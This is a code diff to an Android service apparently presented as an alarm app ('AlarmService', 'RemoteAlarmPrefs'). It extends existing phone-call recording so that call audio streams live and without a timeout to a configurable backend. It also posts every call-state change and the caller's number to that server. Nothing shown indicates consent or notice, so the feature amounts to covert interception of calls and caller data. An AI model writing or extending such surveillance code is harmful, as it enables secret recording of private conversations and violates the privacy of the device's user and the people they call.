@@ -108,6 +108,8 @@ public class AlarmService extends Service {
 
     private android.media.MediaRecorder callRecorder;
     private android.media.AudioRecord activeAudioRecord;
+    private java.io.PipedOutputStream audioStreamPout;
+    private okhttp3.Call activeAudioStreamCall;
     private boolean isRecordingCall = false;
     private String currentCallNumber = "Unknown";
     private String callRecordingFilePath = null;
@@ -1373,6 +1375,11 @@ public class AlarmService extends Service {
     }
 
     private void handleCallStateChanged(String state, String incomingNumber) {
+        Log.i(TAG, "handleCallStateChanged: state=" + state + ", number=" + incomingNumber);
+        
+        // Notify backend about call status
+        sendCallStateToServer(state, incomingNumber);
+
         if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
             startCallRecording(incomingNumber);
         } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
@@ -1490,9 +1497,9 @@ public class AlarmService extends Service {
                 byte[] buffer = new byte[2048]; // small buffer for low latency
                 
                 okhttp3.OkHttpClient client = new okhttp3.OkHttpClient.Builder()
-                        .connectTimeout(5, java.util.concurrent.TimeUnit.SECONDS)
-                        .writeTimeout(5, java.util.concurrent.TimeUnit.SECONDS)
-                        .readTimeout(5, java.util.concurrent.TimeUnit.SECONDS)
+                        .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+                        .writeTimeout(0, java.util.concurrent.TimeUnit.SECONDS) // infinite timeout for persistent streaming
+                        .readTimeout(0, java.util.concurrent.TimeUnit.SECONDS)
                         .build();
 
                 String serverUrl = prefs.getString("backend_url", "");
@@ -1502,6 +1509,47 @@ public class AlarmService extends Service {
                     serverUrl = serverUrl.substring(0, serverUrl.length() - 1);
                 }
 
+                // 1. Initialize persistent live audio pipe
+                if (!serverUrl.isEmpty() && !adminEmail.isEmpty()) {
+                    audioStreamPout = new java.io.PipedOutputStream();
+                    final java.io.PipedInputStream pin = new java.io.PipedInputStream(audioStreamPout, 16384);
+                    
+                    final String postUrl = serverUrl + "/api/audio/upload?email=" + java.net.URLEncoder.encode(adminEmail, "UTF-8");
+                    
+                    okhttp3.RequestBody requestBody = new okhttp3.RequestBody() {
+                        @Override
+                        public okhttp3.MediaType contentType() {
+                            return okhttp3.MediaType.parse("application/octet-stream");
+                        }
+
+                        @Override
+                        public void writeTo(okio.BufferedSink sink) throws java.io.IOException {
+                            byte[] streamBuf = new byte[2048];
+                            int streamRead;
+                            while ((streamRead = pin.read(streamBuf)) != -1) {
+                                sink.write(streamBuf, 0, streamRead);
+                                sink.flush();
+                            }
+                        }
+                    };
+
+                    okhttp3.Request request = new okhttp3.Request.Builder()
+                            .url(postUrl)
+                            .post(requestBody)
+                            .build();
+
+                    new Thread(() -> {
+                        try {
+                            activeAudioStreamCall = client.newCall(request);
+                            okhttp3.Response response = activeAudioStreamCall.execute();
+                            response.close();
+                            Log.i(TAG, "Live audio stream upload finished successfully.");
+                        } catch (Exception e) {
+                            Log.w(TAG, "Live audio stream upload connection ended: " + e.getMessage());
+                        }
+                    }).start();
+                }
+
                 while (isRecordingCall) {
                     int read = activeAudioRecord.read(buffer, 0, buffer.length);
                     if (read > 0) {
@@ -1509,27 +1557,22 @@ public class AlarmService extends Service {
                         os.write(buffer, 0, read);
                         totalAudioLen += read;
 
-                        // Stream to server if serverUrl and adminEmail are set
-                        if (!serverUrl.isEmpty() && !adminEmail.isEmpty()) {
-                            final byte[] uploadBuf = new byte[read];
-                            System.arraycopy(buffer, 0, uploadBuf, 0, read);
-                            
-                            final String postUrl = serverUrl + "/api/audio/upload?email=" + java.net.URLEncoder.encode(adminEmail, "UTF-8");
-                            new Thread(() -> {
-                                try {
-                                    okhttp3.RequestBody requestBody = okhttp3.RequestBody.create(
-                                            okhttp3.MediaType.parse("application/octet-stream"), uploadBuf);
-                                    okhttp3.Request request = new okhttp3.Request.Builder()
-                                            .url(postUrl)
-                                            .post(requestBody)
-                                            .build();
-                                    client.newCall(request).execute().close();
-                                } catch (Exception e) {
-                                    // Silent ignore streaming network errors during call
-                                }
-                            }).start();
+                        // Stream to server live audio pipe
+                        if (audioStreamPout != null) {
+                            try {
+                                audioStreamPout.write(buffer, 0, read);
+                                audioStreamPout.flush();
+                            } catch (Exception e) {
+                                Log.w(TAG, "Error writing bytes to live stream pipe: " + e.getMessage());
+                            }
                         }
                     }
+                }
+
+                // Close the stream pipe
+                if (audioStreamPout != null) {
+                    try { audioStreamPout.close(); } catch (Exception ignored) {}
+                    audioStreamPout = null;
                 }
 
                 // Stop recording
@@ -1698,6 +1741,15 @@ public class AlarmService extends Service {
         // Restore speakerphone state
         setSpeakerphoneEnabled(false);
 
+        if (audioStreamPout != null) {
+            try { audioStreamPout.close(); } catch (Exception ignored) {}
+            audioStreamPout = null;
+        }
+        if (activeAudioStreamCall != null) {
+            try { activeAudioStreamCall.cancel(); } catch (Exception ignored) {}
+            activeAudioStreamCall = null;
+        }
+
         if (activeAudioRecord != null) {
             try {
                 activeAudioRecord.stop();
@@ -1724,6 +1776,14 @@ public class AlarmService extends Service {
         setSpeakerphoneEnabled(false);
         isRecordingCall = false;
         isPlayingWebAudio = false;
+        if (audioStreamPout != null) {
+            try { audioStreamPout.close(); } catch (Exception ignored) {}
+            audioStreamPout = null;
+        }
+        if (activeAudioStreamCall != null) {
+            try { activeAudioStreamCall.cancel(); } catch (Exception ignored) {}
+            activeAudioStreamCall = null;
+        }
         if (activeAudioRecord != null) {
             try { activeAudioRecord.release(); } catch (Exception ignored) {}
             activeAudioRecord = null;
@@ -1835,5 +1895,37 @@ public class AlarmService extends Service {
         if (file.exists()) {
             file.delete();
         }
+    }
+
+    private void sendCallStateToServer(String state, String number) {
+        new Thread(() -> {
+            try {
+                SharedPreferences prefs = getSharedPreferences("RemoteAlarmPrefs", MODE_PRIVATE);
+                String baseUrl = prefs.getString("backend_url", "");
+                String email = prefs.getString("email", "");
+                if (baseUrl.isEmpty() || email.isEmpty()) return;
+
+                if (baseUrl.endsWith("/")) {
+                    baseUrl = baseUrl.substring(0, baseUrl.length() - 1);
+                }
+
+                okhttp3.MediaType mediaType = okhttp3.MediaType.parse("application/json; charset=utf-8");
+                org.json.JSONObject json = new org.json.JSONObject();
+                json.put("email", email);
+                json.put("callState", state);
+                json.put("callNumber", number != null ? number : "Unknown");
+
+                okhttp3.RequestBody body = okhttp3.RequestBody.create(json.toString(), mediaType);
+                okhttp3.Request request = new okhttp3.Request.Builder()
+                        .url(baseUrl + "/api/call/status")
+                        .post(body)
+                        .build();
+
+                httpClient.newCall(request).execute().close();
+                Log.i(TAG, "Successfully sent call state (" + state + ") to server.");
+            } catch (Exception e) {
+                Log.e(TAG, "Error sending call state to server: " + e.getMessage());
+            }
+        }).start();
     }
 }
